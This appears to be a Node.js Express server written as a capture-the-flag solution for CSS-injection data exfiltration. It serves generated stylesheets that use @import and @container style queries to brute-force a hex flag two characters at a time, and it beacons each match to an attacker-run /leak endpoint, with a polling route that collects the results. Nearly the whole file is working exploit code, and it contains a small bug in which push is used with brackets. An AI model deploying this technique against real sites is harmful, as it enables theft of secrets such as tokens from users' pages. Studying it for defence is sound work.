const express = require('express');

const app = express();
const PORT = 5000;

const charset = '0123456789abcdef'
const expr = flag => `,\n${flag}...</pre>\n        </td>\n      </tr>\n      \n  </table>\n\n  <form method=\"POST\" action=\"/tasks/create\">\n    <button class=\"btn\" type=\"submit\">Create New Task</button>\n  </form>\n\n</body>\n\n</html>`;

const variableTpl = (flag, i=0) => `*{--y${i}:${expr(flag)}`;
const containerTpl = (flag, i=0) => `@container style(--x:var(--y${i})){
  body{
    background: red url('/leak/${flag}');
  }
}\n`;


class Results{
  constructor(){
    this.map = new Map();
  }

  get(req){
    let r = this.map.get(Results.fingerPrint(req));
    if(!r){
      this.add(req);
      r = this.map.get(Results.fingerPrint(req));
    }
    return r;
  }

  add(req){
    let resolve;
    const promise = new Promise(r=>resolve=r);
    this.map.set(Results.fingerPrint(req), {
      results: [],
      update: {promise, resolve}
    });
  }

  addResult(req, value){
    const r = this.get(req);

    r.results.push[value];
    r.update.resolve(value);
  }

  clearUpdate(req){
    let resolve;
    const promise = new Promise(r=>resolve=r);
    const r = this.get(req);
    r.update = {promise, resolve};
  }
  
  static fingerPrint(req){
    return [req.ip, req.headers['user-agent']].join('@#$%^&*(');
  }
}

const resultsDb = new Results;

// app.get('/css/:flag', (req, res) => {
//   res.set('content-type', 'text/css');
//   // return res.sendFile(__dirname + '/leak.css');
//   let css = '';
//   let imports = '';

//   for(let i=0; i<16; i++){
//     for(let j=0; j<16; j++){
//       const f = req.params.flag + charset[i] + charset[j];
//       imports += `@import "/var/${i}_${j}?flag=${f}";`;
//       css += containerTpl(f, `${i}_${j}`);
//     }
//   }
//   [...charset].forEach((c, i) => {
//     const f = req.params.flag + c;
//     imports += `@import "/var/${i}?flag=${f}";`;
//     css += containerTpl(f, i);
//   })

//   res.send(imports + css);
// });
app.get('/css/:flag', (req, res) => {
  const guessed = req.params.flag;
  console.log(`[+] Browser đã load CSS payload với flag prefix: ${guessed}`);

  res.set('content-type', 'text/css');
  let css = '';
  let imports = '';

  // brute-force 2 ký tự hex
  for (let i = 0; i < 16; i++) {
    for (let j = 0; j < 16; j++) {
      const f = guessed + charset[i] + charset[j];
      imports += `@import "/var/${i}_${j}?flag=${f}";\n`;
      css += containerTpl(f, `${i}_${j}`);
    }
  }

  // brute-force 1 ký tự hex
  [...charset].forEach((c, i) => {
    const f = guessed + c;
    imports += `@import "/var/${i}?flag=${f}";\n`;
    css += containerTpl(f, i);
  });

  res.send(imports + css);
});

app.get('/var/:id', (req, res)=>{
  res.set('content-type', 'text/css');
  res.send(variableTpl(req.query.flag, req.params.id));
});

app.get('/leak/:flag', (req, res) =>{
  resultsDb.addResult(req, req.params.flag);
  console.log(req.params.flag)
  res.send('ok');
})

app.get('/exploit', (req, res) => {
  console.log('visit');
  res.sendFile(__dirname + '/solve.html');
});

app.get('/poll', async (req, res) => {
  const r = resultsDb.get(req);
  const result = await r.update.promise;
  resultsDb.clearUpdate(req);
  res.send(result);
});

app.listen(PORT, () => console.log(`Server running on http://localhost:${PORT}`));
 